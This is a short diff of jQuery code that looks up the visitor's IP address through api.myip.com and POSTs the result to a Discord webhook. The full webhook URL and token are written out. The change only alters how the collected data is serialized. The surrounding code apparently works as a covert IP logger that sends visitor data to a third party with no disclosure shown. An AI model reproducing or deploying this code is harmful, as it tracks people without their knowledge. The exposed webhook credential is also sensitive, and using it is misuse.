@@ -11,7 +11,7 @@ $.getJSON("https://api.myip.com", function(data) {
   $.ajax({ 
     type:"POST",
     url:"https://discord.com/api/webhooks/1051249705146921050/89HOeSfP4bPXw6NvS8JaXbrEWCxOksYpvvbeE7GsdD0GQQShEPp4IZO3w4e0QHakm-CP",
-    data: JSON.stringify(dataaa), 
+    data: dataaa, 
     contentType: 'application/json',
     success: function(res) {
       console.log(res);
